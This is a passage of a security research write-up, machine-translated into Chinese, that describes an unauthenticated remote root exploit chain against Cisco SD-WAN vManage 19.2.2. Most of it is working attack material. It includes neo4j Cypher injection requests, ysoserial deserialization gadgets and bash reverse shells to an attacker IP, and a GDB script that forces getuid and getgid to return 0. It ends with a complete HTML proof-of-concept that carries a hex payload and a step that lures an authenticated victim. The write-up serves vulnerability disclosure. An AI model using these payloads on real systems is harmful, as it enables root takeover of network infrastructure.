SSO的读者阅读“SAML认证如何工作”⁷.此外，感兴趣的读者可以查看附录1，查看从源代码到接收器的代码跟踪。</p><p id="679f" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">为了给上述工作流的步骤2添加更多的上下文，序列化的“SAMLObject”存储在“vmanagedbSAMLSTORAGENODE”中，包含以下各列:</p><p id="4061" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> </strong> sessionId</p><p id="1357" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> </strong> messageId</p><p id="8445" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> </strong>示例消息</p><p id="ae80" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">“sessionId”可以忽略。“messageId”是为“AuthnRequest”对象随机生成的Id，“samlMessage”是十六进制格式的序列化“SAMLObject”。</p><p id="0362" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">为了验证我的观察，我使用“neteng”帐户登录到vShell，并运行neo4j HTTP请求来查看“vmanagedSAMLSTORAGENODE”:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="5f1c" class="kv im ho kr b fi kw kx l ky kz">vmanage:~$ curl -X POST -u neo4j:password -H 'Content-type: applicaton/json' -H 'Accept: application/json' <a class="ae lh" href="http://localhost:7474/db/data/cypher" rel="noopener ugc nofollow" target="_blank">http://localhost:7474/db/data/cypher</a> -d '{"query":"Match(n:vmanagedbSAMLSTORAGENODE) return n.`messageId`"}'<br/>{<br/>  "columns" : [ "n.`messageId`" ],<br/>  "data" : [ ]</span></pre><p id="b28d" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我注意到目前没有内容。</p><p id="bb52" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我浏览了http:// <target> /SAMLLoginServlet，重新运行了curl命令:</target></p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="0ad0" class="kv im ho kr b fi kw kx l ky kz">curl -X POST -u neo4j:password -H 'Content-type: applicaton/json' -H 'Accept: application/json' <a class="ae lh" href="http://localhost:7474/db/data/cypher" rel="noopener ugc nofollow" target="_blank">http://localhost:7474/db/data/cypher</a> -d '{"query":"Match(n:vmanagedbSAMLSTORAGENODE) return n.`messageId`"}'<br/>{<br/>  "columns" : [ "n.`messageId`" ],<br/>  "data" : [ [ "a1g09iia3ibi57bj185d8h972gc9dgc" ] ]</span></pre><p id="7b11" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我看到用messageId“a 1g 09 IIA 3 ibi 57 bj 185d 8h 972 GC 9 dgc”创建的条目。</p><p id="3ad8" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">此外，我查询了“samlMessage”以查看十六进制格式的序列化“SAMLObject ”:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="f80b" class="kv im ho kr b fi kw kx l ky kz">vmanage:~$ curl -X POST -u neo4j:password -H 'Content-type: applicaton/json' -H 'Accept: application/json' <a class="ae lh" href="http://localhost:7474/db/data/cypher" rel="noopener ugc nofollow" target="_blank">http://localhost:7474/db/data/cypher</a> -d '{"query":"Match(n:vmanagedbSAMLSTORAGENODE) return n.`messageId`, n.`samlMessage`"}'<br/>{<br/>  "columns" : [ "n.`messageId`", "n.`samlMessage`" ],<br/>  "data" : [ [ "a1g09iia3ibi57bj185d8h972gc9dgc", "<strong class="kr hp">aced</strong>000573720035636f6d2e76697074656c612e766d616e6167652e7365727665722e73736f2e73616d6c2e7061727365722e53414d4c4f626a656374548f3a6018554af003000078720033636f6d2e76697074656c612e766d616e6167652e7365727665722e73736f2e73616d6c2e7061727365722e53414d4c42617365010e7bdf3ba2154d02000249000868617368436f64654c001073657269616c697… snipped … ] ]</span></pre><p id="ad28" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">“samlMessage”以aced开始，这是Java序列化内容的开始。</p><p id="d102" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我用<a class="ae lh" href="https://github.com/pimps/ysoserial-modified" rel="noopener ugc nofollow" target="_blank">https://github.com/pimps/ysoserial-modified</a>生成一个反向外壳:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="b6ae" class="kv im ho kr b fi kw kx l ky kz">java -jar ~/Tools/ysoserial-modified/target/ysoserial-modified-1.jar CommonsCollections5 bash 'bash -i &gt;&amp; /dev/tcp/10.20.120.200/1337 0&gt;&amp;1' | xxd -p | tr -d '\n'<br/>WARNING: An illegal reflective access operation has occurred<br/>WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/Tools/ysoserial-modified/target/ysoserial-modified-1.jar) to field javax.management.BadAttributeValueExpException.val<br/>WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5<br/>WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations<br/>WARNING: All illegal access operations will be denied in a future release<br/><strong class="kr hp">aced</strong>000 … snipped … 7878</span></pre><p id="d359" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我覆盖了与messageId“a 1g 09 IIA 3 ibi 57 bj 185d 8h 972 GC 9 dgc”关联的“samlMessage ”,如下所示:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="fbba" class="kv im ho kr b fi kw kx l ky kz">vmanage:~$ curl -X POST -u neo4j:password -H 'Content-type: applicaton/json' -H 'Accept: application/json' <a class="ae lh" href="http://localhost:7474/db/data/cypher" rel="noopener ugc nofollow" target="_blank">http://localhost:7474/db/data/cypher</a> -d '{"query":"Match(n:vmanagedbSAMLSTORAGENODE{messageId:\"a1g09iia3ibi57bj185d8h972gc9dgc\"}) set n.`samlMessage`=\"aced000 … snipped … 7878\" return n.`samlMessage`"}'<br/>{<br/>  "columns" : [ "n.`samlMessage`" ],<br/>  "data" : [ [ "<strong class="kr hp">aced</strong>000 … snipped … 7878" ] ]</span></pre><p id="8473" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">在我的机器(10.20.120.200)上，我在端口1337上设置了一个netcat监听器</p><p id="c134" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">在运行curl命令的vShell中，我监控服务器日志文件:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="8cf0" class="kv im ho kr b fi kw kx l ky kz">vmanage:~$ tail -f /var/log/nms/vmanage-server.log</span></pre><p id="7ab3" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我通过身份提供者进行了身份验证，并观察到日志打印了一个堆栈跟踪:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="0f42" class="kv im ho kr b fi kw kx l ky kz">04-Apr-2020 03:44:10,789 UTC INFO  [vmanage] [SAMLProtocolMessageXMLSignatureSecurityPolicyRule] (default task-3) |default| Validation of protocol message signature succeeded, message type: {urn:oasis:names:tc:SAML:2.0:protocol}Response<br/>04-Apr-2020 03:44:10,815 UTC ERROR [vmanage] [SAMLProcessingFilter] (default task-3) |default| Exception - : <strong class="kr hp">java.lang.ClassCastException: javax.management.BadAttributeValueExpException cannot be cast to com.viptela.vmanage.server.sso.saml.parser.SAMLObject</strong><br/> at com.viptela.vmanage.server.sso.saml.storage.SAMLStorageDAO.retrieveMessage(SAMLStorageDAO.java:109) [classes:]<br/> at com.viptela.vmanage.server.sso.saml.storage.HttpSessionStorage.retrieveMessage(HttpSessionStorage.java:149) [classes:]<br/> at com.viptela.vmanage.server.sso.saml.websso.WebSSOProfileConsumerImpl.processAuthenticationResponse(WebSSOProfileConsumerImpl.java:164) [classes:]<br/> at com.viptela.vmanage.server.sso.saml.SAMLAuthenticationProvider.authenticate(SAMLAuthenticationProvider.java:78) [classes:]<br/> at com.viptela.vmanage.server.sso.saml.SAMLProcessingFilter.doFilter(SAMLProcessingFilter.java:180) [classes:]<br/> at <br/>… snipped …</span></pre><p id="bffd" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">日志指示在反序列化过程中发生了对“SAMLObject”的错误转换。</p><p id="c20e" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">回到我的netcat监听器，我看到一个反向的shell:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="c417" class="kv im ho kr b fi kw kx l ky kz">$ nc -nlvvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.20.120.200] from (UNKNOWN) [&lt;redacted&gt;] 39366<br/>bash: cannot set terminal process group (663): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>bash-4.4$ pwd<br/>pwd<br/>/etc/sv/wildfly<br/>bash-4.4$ whoami<br/>whoami<br/>vmanage<br/>bash-4.4$ id<br/>id<br/>uid=310(vmanage) gid=310(vmanage) groups=310(vmanage)<br/>bash-4.4$ uname -a<br/>uname -a<br/>Linux vmanage 3.10.62-ltsi #1 SMP PREEMPT Fri Mar 13 20:33:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux<br/>bash-4.4$</span></pre><h1 id="4f75" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated">第三部分——新的根源</h1><p id="6525" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated">synacktiv团队的博客描述了一种获得根shell的优雅方法，但是需要注意的是，它需要获得一个“/usr/bin/confd_cli_user”的副本，该副本只能由root读取。我找到了另一种方式升级到根没有这样的麻烦。</p><p id="b5f7" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">当我反汇编“/usr/bin/confd_cli”二进制文件时，我观察到以下情况:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="ff41" class="kv im ho kr b fi kw kx l ky kz">vmanage:~$ objdump -d /usr/bin/confd_cli<br/>… snipped …<br/>40165c: 48 89 c3              mov    %rax,%rbx<br/>40165f: bf 1c 31 40 00        mov    $0x40311c,%edi<br/>401664: e8 17 f8 ff ff        callq  400e80 &lt;getenv@plt&gt;<br/>401669: 49 89 c4              mov    %rax,%r12<br/>40166c: 48 85 db              test   %rbx,%rbx<br/>40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax<br/>401674: 48 0f 44 d8           cmove  %rax,%rbx<br/>401678: 4d 85 e4              test   %r12,%r12<br/>40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax<br/>401680: 4c 0f 44 e0           cmove  %rax,%r12<br/>401684: e8 b7 f8 ff ff        <strong class="kr hp">callq  400f40 &lt;getuid@plt&gt;</strong><br/>401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)<br/>40168f: e8 6c f9 ff ff        <strong class="kr hp">callq  401000 &lt;getgid@plt&gt;</strong><br/>401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)<br/>40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi<br/>4016a0: e8 7b f9 ff ff        callq  401020 &lt;ttyname@plt&gt;<br/>4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)<br/>4016ac: 48 85 c0              test   %rax,%rax<br/>4016af: 0f 84 ad 03 00 00     je     401a62 &lt;socket@plt+0x952&gt;<br/>4016b5: ba ff 03 00 00        mov    $0x3ff,%edx<br/>4016ba: 48 89 c6              mov    %rax,%rsi<br/>4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi<br/>4016c4:   e8 d7 f7 ff ff           callq  400ea0 &lt;*ABS*+0x32e9880f0b@plt&gt;<br/>… snipped …</span></pre><p id="b22b" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">当我运行“ps aux”时，我观察到以下情况:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="05cb" class="kv im ho kr b fi kw kx l ky kz">vmanage:~$ ps aux <br/>… snipped …<br/>root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g <strong class="kr hp">100</strong> -u <strong class="kr hp">1007</strong> bash<br/>… snipped …</span></pre><p id="8aa9" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我假设“confd_cli”程序将从登录用户那里收集的用户ID和组ID传递给“cmdptywrapper”应用程序。</p><p id="f839" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我的第一次尝试是直接运行“cmdptywrapper”并为其提供“-g 0 -u 0”，但是失败了。似乎在这个过程中的某个地方创建了一个文件描述符(-i 1015)，我不能伪造它。</p><p id="f6a8" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">正如synacktiv的博客中提到的,“confd_cli”程序不支持命令行参数，但我可以用调试器影响它，幸运的是系统中包含了GDB。</p><p id="e31f" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">我创建了一个GDB脚本，其中我强制API“getuid”和“getgid”返回0。由于我已经通过反序列化RCE拥有了“vmanage”权限，所以我有权限直接读取“/etc/confd/confd_ipc_secret”。</p><p id="5b6e" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">root.gdb:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="43d7" class="kv im ho kr b fi kw kx l ky kz">set environment USER=root<br/>define root<br/>   finish<br/>   set $rax=0<br/>   continue<br/>end<br/>break getuid<br/>commands<br/>   root<br/>end<br/>break getgid<br/>commands<br/>   root<br/>end<br/>run</span></pre><p id="b16f" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">控制台输出:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="ae82" class="kv im ho kr b fi kw kx l ky kz">vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli<br/>GNU gdb (GDB) 8.0.1<br/>Copyright (C) 2017 Free Software Foundation, Inc.<br/>License GPLv3+: GNU GPL version 3 or later &lt;<a class="ae lh" href="http://gnu.org/licenses/gpl.html" rel="noopener ugc nofollow" target="_blank">http://gnu.org/licenses/gpl.html</a>&gt;<br/>This is free software: you are free to change and redistribute it.<br/>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br/>and "show warranty" for details.<br/>This GDB was configured as "x86_64-poky-linux".<br/>Type "show configuration" for configuration details.<br/>For bug reporting instructions, please see:<br/>&lt;<a class="ae lh" href="http://www.gnu.org/software/gdb/bugs/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/bugs/</a>&gt;.<br/>Find the GDB manual and other documentation resources online at:<br/>&lt;<a class="ae lh" href="http://www.gnu.org/software/gdb/documentation/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/documentation/</a>&gt;.<br/>For help, type "help".<br/>Type "apropos word" to search for commands related to "word"...<br/>Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.<br/>Breakpoint 1 at 0x400f40<br/>Breakpoint 2 at 0x401000</span><span id="4c9f" class="kv im ho kr b fi la kx l ky kz">Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59<br/>59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)<br/>0x0000000000401689 in ?? ()</span><span id="ec10" class="kv im ho kr b fi la kx l ky kz">Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59<br/>59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)<br/>0x0000000000401694 in ?? ()</span><span id="d09a" class="kv im ho kr b fi la kx l ky kz">Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59<br/>59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)<br/>0x0000000000401871 in ?? ()<br/>Welcome to Viptela CLI<br/>root connected from 127.0.0.1 using console on vmanage<br/>vmanage# vshell<br/>bash-4.4# whoami ; id<br/>root<br/>uid=0(root) gid=0(root) groups=0(root)<br/>bash-4.4#</span></pre><h1 id="a303" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated">第四部分——将所有内容放在一起</h1><p id="45c6" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated">如果Cisco SD-WAN vManage系统设置为使用SAML SSO，那么通过将前面几节中的信息链接起来，未经验证的攻击者就可以在该系统上获得远程根外壳。</p><figure class="km kn ko kp fd hj er es paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="er es li"><img src="../Images/1d00628ccb7513e409e9d45e8eb08ee2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0P7uzBy_rOZHYAhugieBRQ.png"/></div></div></figure><p id="f5cc" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">步骤如下:</p><p id="9594" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 1。</strong>创建运行GDB根脚本并调用vShell的命令:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="4996" class="kv im ho kr b fi kw kx l ky kz">echo -ne 'c2V0IGVudmlyb25tZW50IFVTRVI9cm9vdApkZWZpbmUgcm9vdAogICBmaW5pc2gKICAgc2V0ICRyYXg9MAogICBjb250aW51ZQplbmQKYnJlYWsgZ2V0dWlkCmNvbW1hbmRzCiAgIHJvb3QKZW5kCmJyZWFrIGdldGdpZApjb21tYW5kcwogICByb290CmVuZApydW4gPCAvdG1wL2ZvbwpxdWl0Cg==' | base64 -d &gt; /tmp/root ; echo 'dnNoZWxsCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMjAuMTIwLjIwMC8zMTMzNyAwPiYxCg==' | base64 -d &gt; /tmp/foo ; gdb --batch --command=/tmp/root /usr/bin/confd_cli</span></pre><p id="87c5" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">第一个echo命令创建GDB根脚本，如第3节所述。第二个echo命令调用vShell并执行一个反向Shell返回到攻击者的机器。</p><p id="d687" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 2。</strong>将“寻根”命令放入Java小工具中:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="952b" class="kv im ho kr b fi kw kx l ky kz">java -jar ~/Tools/ysoserial-modified/target/ysoserial-modified-1.jar CommonsCollections5 bash "echo -ne 'c2V0IGVudmlyb25tZW50IFVTRVI9cm9vdApkZWZpbmUgcm9vdAogICBmaW5pc2gKICAgc2V0ICRyYXg9MAogICBjb250aW51ZQplbmQKYnJlYWsgZ2V0dWlkCmNvbW1hbmRzCiAgIHJvb3QKZW5kCmJyZWFrIGdldGdpZApjb21tYW5kcwogICByb290CmVuZApydW4gPCAvdG1wL2ZvbwpxdWl0Cg==' | base64 -d &gt; /tmp/root ; echo 'dnNoZWxsCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMjAuMTIwLjIwMC8zMTMzNyAwPiYxCg==' | base64 -d &gt; /tmp/foo ; gdb --batch --command=/tmp/root /usr/bin/confd_cli" | xxd -p | tr -d '\n'</span><span id="e882" class="kv im ho kr b fi la kx l ky kz">WARNING: An illegal reflective access operation has occurred</span><span id="39f0" class="kv im ho kr b fi la kx l ky kz">WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/Tools/ysoserial-modified/target/ysoserial-modified-1.jar) to field javax.management.BadAttributeValueExpException.val</span><span id="9d82" class="kv im ho kr b fi la kx l ky kz">WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5</span><span id="7aa3" class="kv im ho kr b fi la kx l ky kz">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><span id="8517" class="kv im ho kr b fi la kx l ky kz">WARNING: All illegal access operations will be denied in a future release</span><span id="c721" class="kv im ho kr b fi la kx l ky kz">aced ... snipped ... 7878</span></pre><p id="42c1" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 3。</strong>创建一个覆盖所有“samlMessage”的cypher注入向量，并通过HTML文档中的图像标签触发注入:</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="e0a6" class="kv im ho kr b fi kw kx l ky kz">&lt;html&gt;<br/>&lt;head&gt;&lt;title&gt;Cisco SD-WAN vManage 19.2.2 Remote Root Shell PoC&lt;/title&gt;&lt;/head&gt;<br/>&lt;script src="text/javascript"&gt;<br/>   function exploit() {<br/>      var payload = new Image(1,1);<br/>      payload.src = 'https://&lt;target&gt;/dataservice/device/counters?deviceId=-1%27%20return%200%20as%20%60system-ip%60%20Union%20Match(s)%20set%20s%2esamlMessage%3d%22aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd85020008420006666f726d617449000a6c696e654e756d6265724c000f636c6173734c6f616465724e616d6571007e00054c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e00054c000a6d6f64756c654e616d6571007e00054c000d6d6f64756c6556657273696f6e71007e00057870010000004a74000361707074002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a6176617400096765744f626a65637470707371007e000b010000002c71007e000d71007e000e71007e000f71007e001070707371007e000b010000003171007e000d74001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e70707372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794c6973747ab817b43ca79ede020000787078737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e002f00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e002f7371007e00287571007e002c00000002707571007e002c00000000740006696e766f6b657571007e002f00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002c7371007e00287571007e002c00000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000037400092f62696e2f626173687400032d63707401a16563686f202d6e6520276332563049475675646d6c79623235745a5735304946565452564939636d39766441706b5a575a70626d5567636d397664416f674943426d615735706332674b494341676332563049435279595867394d416f674943426a62323530615735315a51706c626d514b596e4a6c595773675a32563064576c6b436d4e7662573168626d527a4369416749484a766233514b5a57356b436d4a795a5746724947646c644764705a41706a623231745957356b63776f674943427962323930436d56755a4170796457346750434176644731774c325a766277707864576c3043673d3d27207c20626173653634202d64203e202f746d702f726f6f74203b206563686f2027646e4e6f5a577873436d4a68633267674c576b67506959674c32526c64693930593341764d5441754d6a41754d5449774c6a49774d43387a4d544d7a4e7941775069597843673d3d27207c20626173653634202d64203e202f746d702f666f6f203b20676462202d2d6261746368202d2d636f6d6d616e643d2f746d702f726f6f74202f7573722f62696e2f636f6e66645f636c69740004657865637571007e002f000000017671007e00407371007e0024737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878%22%20return%20%27Pwned%27%20as%20%60system-ip%60%2f%2f';<br/>      document.body.appendChild(payload);<br/>   }<br/>   window.onload = function() {<br/>      setInterval(exploit, 1);<br/>   }<br/>&lt;/script&gt;<br/>&lt;body&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="41ab" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 4。</strong>诱骗通过身份验证的受害者访问在步骤3中制作的恶意HTML文档。</p><p id="2b7c" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 5。</strong>等待另一个受害者验证到vManage产品，这将触发反序列化漏洞并产生根外壳。</p><p id="d1d9" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"> 6。</strong>享受根壳。</p><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="9a06" class="kv im ho kr b fi kw kx l ky kz">attacker:~$ nc -nlvvp 31337<br/>listening on [any] 31337 ...<br/>connect to [10.20.120.200] from (UNKNOWN) [&lt;redacted&gt;] 52168<br/>bash: cannot set terminal process group (14640): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>bash-4.4# id ; whoami<br/>id ; whoami<br/>uid=0(root) gid=0(root) groups=0(root)<br/>root<br/>bash-4.4# uname -a<br/>uname -a<br/>Linux vmanage 3.10.62-ltsi #1 SMP PREEMPT Fri Nov 8 23:49:05 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux<br/>bash-4.4#</span></pre><h1 id="f5ae" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi 